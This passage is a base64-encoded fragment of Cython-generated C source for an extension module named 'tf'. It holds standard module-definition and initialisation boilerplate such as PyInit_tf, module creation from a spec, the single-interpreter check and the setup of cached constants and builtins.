vcGVfc3RydWN0XzRfZ2VuZXhwci0+dHBfZ2V0YXR0cm8gPT0gUHlPYmplY3RfR2VuZXJpY0dldEF0dHIpKSB7CiAgICBfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfNF9nZW5leHByLT50cF9nZXRhdHRybyA9IFB5T2JqZWN0X0dlbmVyaWNHZXRBdHRyOwogIH0KICAjZW5kaWYKICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTsKICByZXR1cm4gMDsKICBfX3B5eF9MMV9lcnJvcjo7CiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7CiAgcmV0dXJuIC0xOwp9CgpzdGF0aWMgaW50IF9fUHl4X21vZGluaXRfdHlwZV9pbXBvcnRfY29kZShfX3B5eF9tc3RhdGV0eXBlICpfX3B5eF9tc3RhdGUpIHsKICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9ucwogIENZVEhPTl9VTlVTRURfVkFSKF9fcHl4X21zdGF0ZSk7CiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoIl9fUHl4X21vZGluaXRfdHlwZV9pbXBvcnRfY29kZSIsIDApOwogIAogIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpOwogIHJldHVybiAwOwp9CgpzdGF0aWMgaW50IF9fUHl4X21vZGluaXRfdmFyaWFibGVfaW1wb3J0X2NvZGUoX19weXhfbXN0YXRldHlwZSAqX19weXhfbXN0YXRlKSB7CiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnMKICBDWVRIT05fVU5VU0VEX1ZBUihfX3B5eF9tc3RhdGUpOwogIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJfX1B5eF9tb2Rpbml0X3ZhcmlhYmxlX2ltcG9ydF9jb2RlIiwgMCk7CiAgCiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7CiAgcmV0dXJuIDA7Cn0KCnN0YXRpYyBpbnQgX19QeXhfbW9kaW5pdF9mdW5jdGlvbl9pbXBvcnRfY29kZShfX3B5eF9tc3RhdGV0eXBlICpfX3B5eF9tc3RhdGUpIHsKICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9ucwogIENZVEhPTl9VTlVTRURfVkFSKF9fcHl4X21zdGF0ZSk7CiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoIl9fUHl4X21vZGluaXRfZnVuY3Rpb25faW1wb3J0X2NvZGUiLCAwKTsKICAKICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTsKICByZXR1cm4gMDsKfQoKI2lmIENZVEhPTl9QRVA0ODlfTVVMVElfUEhBU0VfSU5JVApzdGF0aWMgUHlPYmplY3QqIF9fcHl4X3B5bW9kX2NyZWF0ZShQeU9iamVjdCAqc3BlYywgUHlNb2R1bGVEZWYgKmRlZik7IApzdGF0aWMgaW50IF9fcHl4X3B5bW9kX2V4ZWNfdGYoUHlPYmplY3QqIG1vZHVsZSk7IApzdGF0aWMgUHlNb2R1bGVEZWZfU2xvdCBfX3B5eF9tb2R1bGVkZWZfc2xvdHNbXSA9IHsKICB7UHlfbW9kX2NyZWF0ZSwgKHZvaWQqKV9fcHl4X3B5bW9kX2NyZWF0ZX0sCiAge1B5X21vZF9leGVjLCAodm9pZCopX19weXhfcHltb2RfZXhlY190Zn0sCiAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTl9GUkVFVEhSRUFESU5HCiAge1B5X21vZF9naWwsIFB5X01PRF9HSUxfVVNFRH0sCiAgI2VuZGlmCiAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQzAwMDAgJiYgQ1lUSE9OX1VTRV9NT0RVTEVfU1RBVEUKICB7UHlfbW9kX211bHRpcGxlX2ludGVycHJldGVycywgUHlfTU9EX01VTFRJUExFX0lOVEVSUFJFVEVSU19OT1RfU1VQUE9SVEVEfSwKICAjZW5kaWYKICB7MCwgTlVMTH0KfTsKI2VuZGlmCgojaWZkZWYgX19jcGx1c3BsdXMKbmFtZXNwYWNlIHsKICBzdHJ1Y3QgUHlNb2R1bGVEZWYgX19weXhfbW9kdWxlZGVmID0KICAjZWxzZQogIHN0YXRpYyBzdHJ1Y3QgUHlNb2R1bGVEZWYgX19weXhfbW9kdWxlZGVmID0KICAjZW5kaWYKICB7CiAgICAgIFB5TW9kdWxlRGVmX0hFQURfSU5JVCwKICAgICAgInRmIiwKICAgICAgMCwgCiAgICAjaWYgQ1lUSE9OX1VTRV9NT0RVTEVfU1RBVEUKICAgICAgc2l6ZW9mKF9fcHl4X21zdGF0ZXR5cGUpLCAKICAgICNlbHNlCiAgICAgIChDWVRIT05fUEVQNDg5X01VTFRJX1BIQVNFX0lOSVQpID8gMCA6IC0xLCAKICAgICNlbmRpZgogICAgICBfX3B5eF9tZXRob2RzICwKICAgICNpZiBDWVRIT05fUEVQNDg5X01VTFRJX1BIQVNFX0lOSVQKICAgICAgX19weXhfbW9kdWxlZGVmX3Nsb3RzLCAKICAgICNlbHNlCiAgICAgIE5VTEwsIAogICAgI2VuZGlmCiAgICAjaWYgQ1lUSE9OX1VTRV9NT0RVTEVfU1RBVEUKICAgICAgX19weXhfbV90cmF2ZXJzZSwgCiAgICAgIF9fcHl4X21fY2xlYXIsIAogICAgICBOVUxMIAogICAgI2Vsc2UKICAgICAgTlVMTCwgCiAgICAgIE5VTEwsIAogICAgICBOVUxMIAogICAgI2VuZGlmCiAgfTsKICAjaWZkZWYgX19jcGx1c3BsdXMKfSAKI2VuZGlmCgoKI2lmbmRlZiBDWVRIT05fTk9fUFlJTklUX0VYUE9SVAogICNkZWZpbmUgX19QeXhfUHlNT0RJTklUX0ZVTkMgUHlNT0RJTklUX0ZVTkMKI2Vsc2UKICAjaWZkZWYgX19jcGx1c3BsdXMKICAjZGVmaW5lIF9fUHl4X1B5TU9ESU5JVF9GVU5DIGV4dGVybiAiQyIgUHlPYmplY3QgKgogICNlbHNlCiAgI2RlZmluZSBfX1B5eF9QeU1PRElOSVRfRlVOQyBQeU9iamVjdCAqCiAgI2VuZGlmCiNlbmRpZgoKX19QeXhfUHlNT0RJTklUX0ZVTkMgUHlJbml0X3RmKHZvaWQpIENZVEhPTl9TTUFMTF9DT0RFOyAKX19QeXhfUHlNT0RJTklUX0ZVTkMgUHlJbml0X3RmKHZvaWQpCiNpZiBDWVRIT05fUEVQNDg5X01VTFRJX1BIQVNFX0lOSVQKewogIHJldHVybiBQeU1vZHVsZURlZl9Jbml0KCZfX3B5eF9tb2R1bGVkZWYpOwp9CgojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAmJiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYIDwgMHgwMzA5MDAwMApzdGF0aWMgUFlfSU5UNjRfVCBfX1B5eF9HZXRDdXJyZW50SW50ZXJwcmV0ZXJJZCh2b2lkKSB7CiAgICB7CiAgICAgICAgUHlPYmplY3QgKm1vZHVsZSA9IFB5SW1wb3J0X0ltcG9ydE1vZHVsZSgiX2ludGVycHJldGVycyIpOyAvLyAzLjEzKyBJIHRoaW5rCiAgICAgICAgaWYgKCFtb2R1bGUpIHsKICAgICAgICAgICAgUHlFcnJfQ2xlYXIoKTsgLy8ganVzdCB0cnkgdGhlIDMuOC0zLjEyIHZlcnNpb24KICAgICAgICAgICAgbW9kdWxlID0gUHlJbXBvcnRfSW1wb3J0TW9kdWxlKCJfeHhzdWJpbnRlcnByZXRlcnMiKTsKICAgICAgICAgICAgaWYgKCFtb2R1bGUpIGdvdG8gYmFkOwogICAgICAgIH0KICAgICAgICBQeU9iamVjdCAqY3VycmVudCA9IFB5T2JqZWN0X0NhbGxNZXRob2QobW9kdWxlLCAiZ2V0X2N1cnJlbnQiLCBOVUxMKTsKICAgICAgICBQeV9ERUNSRUYobW9kdWxlKTsKICAgICAgICBpZiAoIWN1cnJlbnQpIGdvdG8gYmFkOwogICAgICAgIGlmIChQeVR1cGxlX0NoZWNrKGN1cnJlbnQpKSB7CiAgICAgICAgICAgIFB5T2JqZWN0ICpuZXdfY3VycmVudCA9IFB5U2VxdWVuY2VfR2V0SXRlbShjdXJyZW50LCAwKTsKICAgICAgICAgICAgUHlfREVDUkVGKGN1cnJlbnQpOwogICAgICAgICAgICBjdXJyZW50ID0gbmV3X2N1cnJlbnQ7CiAgICAgICAgICAgIGlmICghbmV3X2N1cnJlbnQpIGdvdG8gYmFkOwogICAgICAgIH0KICAgICAgICBsb25nIGxvbmcgYXNfY19pbnQgPSBQeUxvbmdfQXNMb25nTG9uZyhjdXJyZW50KTsKICAgICAgICBQeV9ERUNSRUYoY3VycmVudCk7CiAgICAgICAgcmV0dXJuIGFzX2NfaW50OwogICAgfQogIGJhZDoKICAgIFB5U3lzX1dyaXRlU3RkZXJyKCJfX1B5eF9HZXRDdXJyZW50SW50ZXJwcmV0ZXJJZCBmYWlsZWQuIFRyeSBzZXR0aW5nIHRoZSBDIGRlZmluZSBDWVRIT05fUEVQNDg5X01VTFRJX1BIQVNFX0lOSVQ9MFxuIik7CiAgICByZXR1cm4gLTE7Cn0KI2VuZGlmCiNpZiAhQ1lUSE9OX1VTRV9NT0RVTEVfU1RBVEUKc3RhdGljIENZVEhPTl9TTUFMTF9DT0RFIGludCBfX1B5eF9jaGVja19zaW5nbGVfaW50ZXJwcmV0ZXIodm9pZCkgewogICAgc3RhdGljIFBZX0lOVDY0X1QgbWFpbl9pbnRlcnByZXRlcl9pZCA9IC0xOwojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9HUkFBTAogICAgUFlfSU5UNjRfVCBjdXJyZW50X2lkID0gUHlJbnRlcnByZXRlclN0YXRlX0dldElERnJvbVRocmVhZFN0YXRlKFB5VGhyZWFkU3RhdGVfR2V0KCkpOwojZWxpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJICYmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPj0gMHgwMzA5MDAwMAogICAgUFlfSU5UNjRfVCBjdXJyZW50X2lkID0gUHlJbnRlcnByZXRlclN0YXRlX0dldElEKFB5SW50ZXJwcmV0ZXJTdGF0ZV9HZXQoKSk7CiNlbGlmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgIFBZX0lOVDY0X1QgY3VycmVudF9pZCA9IF9fUHl4X0dldEN1cnJlbnRJbnRlcnByZXRlcklkKCk7CiNlbHNlCiAgICBQWV9JTlQ2NF9UIGN1cnJlbnRfaWQgPSBQeUludGVycHJldGVyU3RhdGVfR2V0SUQoUHlUaHJlYWRTdGF0ZV9HZXQoKS0+aW50ZXJwKTsKI2VuZGlmCiAgICBpZiAodW5saWtlbHkoY3VycmVudF9pZCA9PSAtMSkpIHsKICAgICAgICByZXR1cm4gLTE7CiAgICB9CiAgICBpZiAobWFpbl9pbnRlcnByZXRlcl9pZCA9PSAtMSkgewogICAgICAgIG1haW5faW50ZXJwcmV0ZXJfaWQgPSBjdXJyZW50X2lkOwogICAgICAgIHJldHVybiAwOwogICAgfSBlbHNlIGlmICh1bmxpa2VseShtYWluX2ludGVycHJldGVyX2lkICE9IGN1cnJlbnRfaWQpKSB7CiAgICAgICAgUHlFcnJfU2V0U3RyaW5nKAogICAgICAgICAgICBQeUV4Y19JbXBvcnRFcnJvciwKICAgICAgICAgICAgIkludGVycHJldGVyIGNoYW5nZSBkZXRlY3RlZCAtIHRoaXMgbW9kdWxlIGNhbiBvbmx5IGJlIGxvYWRlZCBpbnRvIG9uZSBpbnRlcnByZXRlciBwZXIgcHJvY2Vzcy4iKTsKICAgICAgICByZXR1cm4gLTE7CiAgICB9CiAgICByZXR1cm4gMDsKfQojZW5kaWYKc3RhdGljIENZVEhPTl9TTUFMTF9DT0RFIGludCBfX1B5eF9jb3B5X3NwZWNfdG9fbW9kdWxlKFB5T2JqZWN0ICpzcGVjLCBQeU9iamVjdCAqbW9kZGljdCwgY29uc3QgY2hhciogZnJvbV9uYW1lLCBjb25zdCBjaGFyKiB0b19uYW1lLCBpbnQgYWxsb3dfbm9uZSkKewogICAgUHlPYmplY3QgKnZhbHVlID0gUHlPYmplY3RfR2V0QXR0clN0cmluZyhzcGVjLCBmcm9tX25hbWUpOwogICAgaW50IHJlc3VsdCA9IDA7CiAgICBpZiAobGlrZWx5KHZhbHVlKSkgewogICAgICAgIGlmIChhbGxvd19ub25lIHx8IHZhbHVlICE9IFB5X05vbmUpIHsKICAgICAgICAgICAgcmVzdWx0ID0gUHlEaWN0X1NldEl0ZW1TdHJpbmcobW9kZGljdCwgdG9fbmFtZSwgdmFsdWUpOwogICAgICAgIH0KICAgICAgICBQeV9ERUNSRUYodmFsdWUpOwogICAgfSBlbHNlIGlmIChQeUVycl9FeGNlcHRpb25NYXRjaGVzKFB5RXhjX0F0dHJpYnV0ZUVycm9yKSkgewogICAgICAgIFB5RXJyX0NsZWFyKCk7CiAgICB9IGVsc2UgewogICAgICAgIHJlc3VsdCA9IC0xOwogICAgfQogICAgcmV0dXJuIHJlc3VsdDsKfQpzdGF0aWMgQ1lUSE9OX1NNQUxMX0NPREUgUHlPYmplY3QqIF9fcHl4X3B5bW9kX2NyZWF0ZShQeU9iamVjdCAqc3BlYywgUHlNb2R1bGVEZWYgKmRlZikgewogICAgUHlPYmplY3QgKm1vZHVsZSA9IE5VTEwsICptb2RkaWN0LCAqbW9kbmFtZTsKICAgIENZVEhPTl9VTlVTRURfVkFSKGRlZik7CiAgICAjaWYgIUNZVEhPTl9VU0VfTU9EVUxFX1NUQVRFCiAgICBpZiAoX19QeXhfY2hlY2tfc2luZ2xlX2ludGVycHJldGVyKCkpCiAgICAgICAgcmV0dXJuIE5VTEw7CiAgICAjZW5kaWYKICAgIGlmIChfX3B5eF9tKQogICAgICAgIHJldHVybiBfX1B5eF9OZXdSZWYoX19weXhfbSk7CiAgICBtb2RuYW1lID0gUHlPYmplY3RfR2V0QXR0clN0cmluZyhzcGVjLCAibmFtZSIpOwogICAgaWYgKHVubGlrZWx5KCFtb2RuYW1lKSkgZ290byBiYWQ7CiAgICBtb2R1bGUgPSBQeU1vZHVsZV9OZXdPYmplY3QobW9kbmFtZSk7CiAgICBQeV9ERUNSRUYobW9kbmFtZSk7CiAgICBpZiAodW5saWtlbHkoIW1vZHVsZSkpIGdvdG8gYmFkOwogICAgbW9kZGljdCA9IFB5TW9kdWxlX0dldERpY3QobW9kdWxlKTsKICAgIGlmICh1bmxpa2VseSghbW9kZGljdCkpIGdvdG8gYmFkOwogICAgaWYgKHVubGlrZWx5KF9fUHl4X2NvcHlfc3BlY190b19tb2R1bGUoc3BlYywgbW9kZGljdCwgImxvYWRlciIsICJfX2xvYWRlcl9fIiwgMSkgPCAwKSkgZ290byBiYWQ7CiAgICBpZiAodW5saWtlbHkoX19QeXhfY29weV9zcGVjX3RvX21vZHVsZShzcGVjLCBtb2RkaWN0LCAib3JpZ2luIiwgIl9fZmlsZV9fIiwgMSkgPCAwKSkgZ290byBiYWQ7CiAgICBpZiAodW5saWtlbHkoX19QeXhfY29weV9zcGVjX3RvX21vZHVsZShzcGVjLCBtb2RkaWN0LCAicGFyZW50IiwgIl9fcGFja2FnZV9fIiwgMSkgPCAwKSkgZ290byBiYWQ7CiAgICBpZiAodW5saWtlbHkoX19QeXhfY29weV9zcGVjX3RvX21vZHVsZShzcGVjLCBtb2RkaWN0LCAic3VibW9kdWxlX3NlYXJjaF9sb2NhdGlvbnMiLCAiX19wYXRoX18iLCAwKSA8IDApKSBnb3RvIGJhZDsKICAgIHJldHVybiBtb2R1bGU7CmJhZDoKICAgIFB5X1hERUNSRUYobW9kdWxlKTsKICAgIHJldHVybiBOVUxMOwp9CgoKc3RhdGljIENZVEhPTl9TTUFMTF9DT0RFIGludCBfX3B5eF9weW1vZF9leGVjX3RmKFB5T2JqZWN0ICpfX3B5eF9weWluaXRfbW9kdWxlKQojZW5kaWYKewogIGludCBzdHJpbmd0YWJfaW5pdGlhbGl6ZWQgPSAwOwogICNpZiBDWVRIT05fVVNFX01PRFVMRV9TVEFURQogIGludCBweXN0YXRlX2FkZG1vZHVsZV9ydW4gPSAwOwogICNlbmRpZgogIF9fcHl4X21zdGF0ZXR5cGUgKl9fcHl4X21zdGF0ZSA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfMSA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfMiA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfMyA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfNCA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfNSA9IE5VTEw7CiAgc2l6ZV90IF9fcHl4X3RfNjsKICBQeU9iamVjdCAqX19weXhfdF83ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF84ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF85ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8xMCA9IE5VTEw7CiAgaW50IF9fcHl4X3RfMTE7CiAgaW50IF9fcHl4X3RfMTI7CiAgaW50IF9fcHl4X3RfMTM7CiAgY2hhciBjb25zdCAqX19weXhfdF8xNDsKICBQeU9iamVjdCAqX19weXhfdF8xNSA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfMTYgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzE3ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8xOCA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfMTkgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzIwID0gTlVMTDsKICBpbnQgX19weXhfbGluZW5vID0gMDsKICBjb25zdCBjaGFyICpfX3B5eF9maWxlbmFtZSA9IE5VTEw7CiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwOwogIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zCiAgI2lmIENZVEhPTl9QRVA0ODlfTVVMVElfUEhBU0VfSU5JVAogIGlmIChfX3B5eF9tKSB7CiAgICBpZiAoX19weXhfbSA9PSBfX3B5eF9weWluaXRfbW9kdWxlKSByZXR1cm4gMDsKICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19SdW50aW1lRXJyb3IsICJNb2R1bGUgJ3RmJyBoYXMgYWxyZWFkeSBiZWVuIGltcG9ydGVkLiBSZS1pbml0aWFsaXNhdGlvbiBpcyBub3Qgc3VwcG9ydGVkLiIpOwogICAgcmV0dXJuIC0xOwogIH0KICAjZWxzZQogIGlmIChfX3B5eF9tKSByZXR1cm4gX19QeXhfTmV3UmVmKF9fcHl4X20pOwogICNlbmRpZgogIAogICNpZiBDWVRIT05fUEVQNDg5X01VTFRJX1BIQVNFX0lOSVQKICBfX3B5eF90XzEgPSBfX3B5eF9weWluaXRfbW9kdWxlOwogIFB5X0lOQ1JFRihfX3B5eF90XzEpOwogICNlbHNlCiAgX19weXhfdF8xID0gUHlNb2R1bGVfQ3JlYXRlKCZfX3B5eF9tb2R1bGVkZWYpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICAjZW5kaWYKICAjaWYgQ1lUSE9OX1VTRV9NT0RVTEVfU1RBVEUKICB7CiAgICBpbnQgYWRkX21vZHVsZV9yZXN1bHQgPSBfX1B5eF9TdGF0ZV9BZGRNb2R1bGUoX19weXhfdF8xLCAmX19weXhfbW9kdWxlZGVmKTsKICAgIF9fcHl4X3RfMSA9IDA7IAogICAgaWYgKHVubGlrZWx5KChhZGRfbW9kdWxlX3Jlc3VsdCA8IDApKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogICAgcHlzdGF0ZV9hZGRtb2R1bGVfcnVuID0gMTsKICB9CiAgI2Vsc2UKICBfX3B5eF9tID0gX19weXhfdF8xOwogICNlbmRpZgogICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElORwogIFB5VW5zdGFibGVfTW9kdWxlX1NldEdJTChfX3B5eF9tLCBQeV9NT0RfR0lMX1VTRUQpOwogICNlbmRpZgogIF9fcHl4X21zdGF0ZSA9IF9fcHl4X21zdGF0ZV9nbG9iYWw7CiAgQ1lUSE9OX1VOVVNFRF9WQVIoX19weXhfdF8xKTsKICBfX3B5eF9tc3RhdGUtPl9fcHl4X2QgPSBQeU1vZHVsZV9HZXREaWN0KF9fcHl4X20pOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfZCkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICBQeV9JTkNSRUYoX19weXhfbXN0YXRlLT5fX3B5eF9kKTsKICBfX3B5eF9tc3RhdGUtPl9fcHl4X2IgPSBfX1B5eF9QeUltcG9ydF9BZGRNb2R1bGVSZWYoX19QeXhfQlVJTFRJTl9NT0RVTEVfTkFNRSk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9iKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogIF9fcHl4X21zdGF0ZS0+X19weXhfY3l0aG9uX3J1bnRpbWUgPSBfX1B5eF9QeUltcG9ydF9BZGRNb2R1bGVSZWYoImN5dGhvbl9ydW50aW1lIik7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9jeXRob25fcnVudGltZSkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICBpZiAoUHlPYmplY3RfU2V0QXR0clN0cmluZyhfX3B5eF9tLCAiX19idWlsdGluc19fIiwgX19weXhfbXN0YXRlLT5fX3B5eF9iKSA8IDApIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICAKICAjaWYgQ1lUSE9OX1JFRk5BTk5ZCl9fUHl4X1JlZk5hbm55ID0gX19QeXhfUmVmTmFubnlJbXBvcnRBUEkoInJlZm5hbm55Iik7CmlmICghX19QeXhfUmVmTmFubnkpIHsKICBQeUVycl9DbGVhcigpOwogIF9fUHl4X1JlZk5hbm55ID0gX19QeXhfUmVmTmFubnlJbXBvcnRBUEkoIkN5dGhvbi5SdW50aW1lLnJlZm5hbm55Iik7CiAgaWYgKCFfX1B5eF9SZWZOYW5ueSkKICAgICAgUHlfRmF0YWxFcnJvcigiZmFpbGVkIHRvIGltcG9ydCAncmVmbmFubnknIG1vZHVsZSIpOwp9CiNlbmRpZgoKX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoIlB5SW5pdF90ZiIsIDApOwogIGlmIChfX1B5eF9jaGVja19iaW5hcnlfdmVyc2lvbihfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYLCBfX1B5eF9nZXRfcnVudGltZV92ZXJzaW9uKCksIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkpIDwgKDApKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCiAgI2lmZGVmIF9fUHh5X1B5RnJhbWVfSW5pdGlhbGl6ZV9PZmZzZXRzCiAgX19QeHlfUHlGcmFtZV9Jbml0aWFsaXplX09mZnNldHMoKTsKICAjZW5kaWYKICBfX3B5eF9tc3RhdGUtPl9fcHl4X2VtcHR5X3R1cGxlID0gUHlUdXBsZV9OZXcoMCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9lbXB0eV90dXBsZSkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICBfX3B5eF9tc3RhdGUtPl9fcHl4X2VtcHR5X2J5dGVzID0gUHlCeXRlc19Gcm9tU3RyaW5nQW5kU2l6ZSgiIiwgMCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9lbXB0eV9ieXRlcykpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICBfX3B5eF9tc3RhdGUtPl9fcHl4X2VtcHR5X3VuaWNvZGUgPSBQeVVuaWNvZGVfRnJvbVN0cmluZ0FuZFNpemUoIiIsIDApOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfZW1wdHlfdW5pY29kZSkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICAKICBpZiAoX19QeXhfSW5pdENvbnN0YW50cyhfX3B5eF9tc3RhdGUpIDwgKDApKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCiAgc3RyaW5ndGFiX2luaXRpYWxpemVkID0gMTsKICBpZiAoX19QeXhfSW5pdEdsb2JhbHMoKSA8ICgwKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogICNpZiAwIHx8IGRlZmluZWQoX19QeXhfQ3lGdW5jdGlvbl9VU0VEKSB8fCBkZWZpbmVkKF9fUHl4X0Z1c2VkRnVuY3Rpb25fVVNFRCkgfHwgZGVmaW5lZChfX1B5eF9Db3JvdXRpbmVfVVNFRCkgfHwgZGVmaW5lZChfX1B5eF9HZW5lcmF0b3JfVVNFRCkgfHwgZGVmaW5lZChfX1B5eF9Bc3luY0dlbl9VU0VEKQogIGlmIChfX3B5eF9Db21tb25UeXBlc01ldGFjbGFzc19pbml0KF9fcHl4X20pIDwgKDApKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCiAgI2VuZGlmCiAgI2lmZGVmIF9fUHl4X0N5RnVuY3Rpb25fVVNFRAogIGlmIChfX3B5eF9DeUZ1bmN0aW9uX2luaXQoX19weXhfbSkgPCAoMCkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICAjZW5kaWYKICAjaWZkZWYgX19QeXhfRnVzZWRGdW5jdGlvbl9VU0VECiAgaWYgKF9fcHl4X0Z1c2VkRnVuY3Rpb25faW5pdChfX3B5eF9tKSA8ICgwKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogICNlbmRpZgogICNpZmRlZiBfX1B5eF9Db3JvdXRpbmVfVVNFRAogIGlmIChfX3B5eF9Db3JvdXRpbmVfaW5pdChfX3B5eF9tKSA8ICgwKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogICNlbmRpZgogICNpZmRlZiBfX1B5eF9HZW5lcmF0b3JfVVNFRAogIGlmIChfX3B5eF9HZW5lcmF0b3JfaW5pdChfX3B5eF9tKSA8ICgwKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogICNlbmRpZgogICNpZmRlZiBfX1B5eF9Bc3luY0dlbl9VU0VECiAgaWYgKF9fcHl4X0FzeW5jR2VuX2luaXQoX19weXhfbSkgPCAoMCkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICAjZW5kaWYKICAKICBpZiAoX19weXhfbW9kdWxlX2lzX21haW5fdGYpIHsKICAgIGlmIChQeU9iamVjdF9TZXRBdHRyKF9fcHl4X20sIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9uYW1lXzIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9tYWluKSA8ICgwKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogIH0KICB7CiAgICBQeU9iamVjdCAqbW9kdWxlcyA9IFB5SW1wb3J0X0dldE1vZHVsZURpY3QoKTsgaWYgKHVubGlrZWx5KCFtb2R1bGVzKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogICAgaWYgKCFQeURpY3RfR2V0SXRlbVN0cmluZyhtb2R1bGVzLCAidGYiKSkgewogICAgICBpZiAodW5saWtlbHkoKFB5RGljdF9TZXRJdGVtU3RyaW5nKG1vZHVsZXMsICJ0ZiIsIF9fcHl4X20pIDwgMCkpKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCiAgICB9CiAgfQogIAogIGlmIChfX1B5eF9Jbml0Q2FjaGVkQnVpbHRpbnMoX19weXhfbXN0YXRlKSA8ICgwKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogIAogIGlmIChfX1B5eF9Jbml0Q2FjaGVkQ29uc3RhbnRzKF9fcHl4X21zdGF0ZSkgPCAoMCkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICBpZiAoX19QeXhfQ3JlYXRlQ29kZU9iamVjdHMoX19weXhfbXN0YXRlKSA8ICgwKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogIAogICh2b2lkKV9fUHl4X21vZGluaXRfZ2xvYmFsX2luaXRfY29kZShfX3B5eF9tc3RhdGUpOwogICh2b2lkKV9fUHl4X21vZGluaXRfdmFyaWFibGVfZXhwb3J0X2NvZGUoX19weXhfbXN0YXRlKTsKICAodm9pZClfX1B5eF9tb2Rpbml0X2Z1bmN0aW9uX2V4cG9ydF9jb2RlKF9fcHl4X21zdGF0ZSk7CiAgaWYgKHVubGlrZWx5KChfX1B5eF9tb2Rpbml0X3R5cGVfaW5pdF9jb2RlKF9fcHl4X21zdGF0ZSkgPCAwKSkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICAodm9pZClfX1B5eF9tb2Rpbml0X3R5cGVfaW1wb3J0X2NvZGUoX19weXhfbXN0YXRlKTsKICAodm9pZCl